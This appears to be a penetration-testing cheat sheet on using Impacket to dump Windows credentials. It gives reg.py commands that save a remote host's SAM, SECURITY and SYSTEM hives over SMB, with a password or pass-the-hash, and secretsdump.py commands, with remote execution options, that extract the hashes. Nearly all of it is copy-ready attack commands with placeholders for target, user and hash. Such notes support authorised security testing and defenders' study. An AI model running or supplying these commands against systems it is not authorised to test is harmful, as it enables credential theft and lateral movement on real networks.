---
author(s):
  - Userware
tags:
  - post-exploitation
  - os-credential-dumping
  - network-ports
  - msrpc
  - smb
  - staying-off-the-land
  - windows
---
# Impacket

## 01 - Manual Hashdump

### 1.1 - Extract hive files

#### 1.1.1 - MSRPC Port

```
$ export IP="<target_IP>"
export USERNAME="<username>"
export PASSWORD="<password>"
reg.py "$USERNAME":"$PASSWORD"@$IP save -keyName "HKLM\SAM" -o "\\\\$IP\\c$\\windows\\temp\\"
reg.py "$USERNAME":"$PASSWORD"@$IP save -keyName "HKLM\SECURITY" -o "\\\\$IP\\c$\\windows\\temp\\"
reg.py "$USERNAME":"$PASSWORD"@$IP save -keyName "HKLM\SYSTEM" -o "\\\\$IP\\c$\\windows\\temp\\"
```

Pass The Hash

```
$ export IP="<target_IP>"
export USERNAME="<username>"
export NT_HASH="<nt_hash>"
reg.py "$USERNAME"@$IP -hashes :$NT_HASH save -keyName "HKLM\SAM" -o "\\\\$IP\\c$\\windows\\temp\\"
reg.py "$USERNAME"@$IP -hashes :$NT_HASH save -keyName "HKLM\SECURITY" -o "\\\\$IP\\c$\\windows\\temp\\"
reg.py "$USERNAME"@$IP -hashes :$NT_HASH save -keyName "HKLM\SYSTEM" -o "\\\\$IP\\c$\\windows\\temp\\"
```

### 1.2 - Parse hive files

```
$ secretsdump.py [<domain>/]<username>:<password>@<IP> [-exec-method <smbexec | wmiexec | mmcexec>] -use-remoteSSMethod

$ secretsdump.py [<domain>/]<username>@<IP> -hashes :<nt_hash> [-exec-method <smbexec | wmiexec | mmcexec>] -use-remoteSSMethod
```

## 02 - Automated Hashdump

```
$ secretsdump.py [<domain>/]<username>:<password>@<IP> [-exec-method <smbexec | wmiexec | mmcexec>]

$ secretsdump.py [<domain>/]<username>@<IP> -hashes :<nt_hash> [-exec-method <smbexec | wmiexec | mmcexec>]
```

---
## References

### Wadcoms

- [Wadcoms: Impacket Secretsdump](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/)

### The Hacker Recipes

- [The Hacker Recipes: NTDS secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)